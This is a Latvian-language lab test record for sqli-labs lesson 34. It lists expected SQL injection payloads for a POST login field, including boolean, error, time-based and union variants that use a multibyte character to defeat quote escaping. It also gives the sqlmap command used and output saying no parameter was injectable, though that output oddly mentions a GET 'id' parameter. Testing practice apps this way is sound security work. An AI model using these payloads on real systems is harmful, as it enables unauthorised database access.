=================================================================================
1. Īpašība: pirms bīstamiem simboliem (šajā gadījumā pirms pēdiņām) ir filtrs, kas ievieto "\", get atšķirībā no sqli-labs32 šeit jātiek galā ar POST parametru, kļūdas gadījumā ziņojums NEparādās rezultāta tajā pašā vietā
2. Nepiciešams tampering: jā, --tamper=unmagicquotes
3. Sagaidāmais rezultāts: 
3.1. boolean-based: uname=�' or 1=1#&passwd=test
3.2. error-based: uname=�'
3.3. time-based: uname=�' or sleep(1)#&passwd=test
3.4. union: uname=�' union select 1,2#&passwd=test
4. Reālais rezultāts: redzams zemāk
5. Vidējais risinājuma ilgums: 71940500 nanosekundes
6. Palaistā komanda
sqlmap -u "http://localhost/sqli-labs/sqli-labs/Less-34/" -p uname,passwd --data="uname=test&passwd=test" -risk=3 --level=5 --tamper=unmagicquotes

7. Jautājumi, kurus uzdeva SQLMap:
7.1. it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
=================================================================================
false positive or unexploitable injection point detecteed
GET parameter 'id' does not seem to be injectable

all tested parameters do not appear to be injectable. Also, you can try to rerun by providing a valid value for option '--string' as perhaps the string you have chosen does not match exclusively True responses. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or swtich '--random-agent'
